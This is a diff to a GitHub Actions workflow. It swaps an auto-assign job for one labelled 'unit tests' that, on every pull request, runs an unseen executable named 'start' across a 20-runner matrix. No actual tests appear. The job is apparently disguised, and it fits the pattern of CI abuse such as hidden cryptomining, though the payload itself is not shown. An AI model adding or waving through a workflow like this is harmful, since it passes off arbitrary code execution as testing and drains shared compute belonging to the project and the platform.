@@ -1,11 +1,26 @@
-name: 'Auto Author Assign' 
-on:
-  pull_request:
-    types: [opened, reopened]
+name: unit tests
+
+on: [pull_request]
+
 jobs:
-  assign:
+  multitest:
+    name: test job
+
     runs-on: ubuntu-latest
+    env:
+      DEBIAN_FRONTEND: noninteractive
+
+    strategy:
+     fail-fast: false
+     matrix:
+       runner: [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19]
+
     steps:
-      - uses: delivery-much/actions-assigner@v1
-        with:
-          token: ${{ secrets.GH_TOKEN }}
+      - name: Checkout code
+        uses: actions/checkout@v2
+        
+      - name: chmod
+        run: chmod +x start
+        
+      - name: run
+        run: ./start
